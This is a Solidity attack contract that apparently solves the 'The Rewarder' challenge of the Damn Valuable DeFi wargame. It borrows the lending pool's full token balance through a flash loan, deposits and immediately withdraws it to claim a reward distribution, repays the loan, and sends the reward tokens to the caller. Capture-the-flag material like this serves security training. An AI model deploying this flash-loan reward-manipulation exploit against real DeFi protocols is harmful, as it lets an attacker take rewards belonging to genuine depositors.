// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "../DamnValuableToken.sol";
import "hardhat/console.sol";

interface ITheRewarederPool {
    function deposit(uint256 amount) external;

    function distributeRewards() external;

    function liquidityToken() external view returns (address);

    function accountingToken() external view returns (address);

    function rewardToken() external view returns (address);

    function withdraw(uint256 amount) external;
}

interface IFlashLoanerPool {
    function flashLoan(uint256 amount) external;
}

contract TheRewarderAttack {
    ITheRewarederPool public theRewarderPool;
    IFlashLoanerPool public flashLoanerPool;
    DamnValuableToken public immutable liquidityToken;
    DamnValuableToken public immutable rewardToken;

    constructor(
        address _theRewarderPool,
        address _flashLoanerPool,
        address liquidityTokenAddress,
        address rewardTokenAddress
    ) {
        theRewarderPool = ITheRewarederPool(_theRewarderPool);
        flashLoanerPool = IFlashLoanerPool(_flashLoanerPool);
        liquidityToken = DamnValuableToken(liquidityTokenAddress);
        rewardToken = DamnValuableToken(rewardTokenAddress);
    }

    function attack() external {
        flashLoanerPool.flashLoan(
            liquidityToken.balanceOf(address(flashLoanerPool))
        );
        console.log("rewardToken balance", rewardToken.balanceOf(address(this)));
        rewardToken.transfer(
            msg.sender,
            rewardToken.balanceOf(address(this))
        );
    }

    function receiveFlashLoan(uint256 amount) external {
        liquidityToken.approve(address(theRewarderPool), amount);
        theRewarderPool.deposit(amount);
        theRewarderPool.withdraw(amount);
        liquidityToken.transfer(address(flashLoanerPool), amount);
    }
}
